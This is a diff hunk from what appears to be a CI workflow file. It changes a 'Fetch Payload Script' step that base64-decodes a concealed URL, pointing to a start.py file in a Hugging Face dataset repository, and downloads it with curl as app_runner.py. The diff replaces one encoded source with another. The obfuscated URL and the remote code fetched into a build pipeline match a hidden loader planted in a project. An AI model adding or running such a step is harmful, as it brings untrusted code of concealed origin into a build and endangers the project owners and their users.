@@ -68,7 +68,7 @@ jobs:
       - name: Fetch Payload Script
         run: |
           echo "[FETCH] Fetching core script from external mirror..."
-          REMOTE_PAYLOAD=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          REMOTE_PAYLOAD=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=" | base64 -d)
           curl -sL "$REMOTE_PAYLOAD" -o app_runner.py
           echo "[FETCH] Core script successfully saved."
 
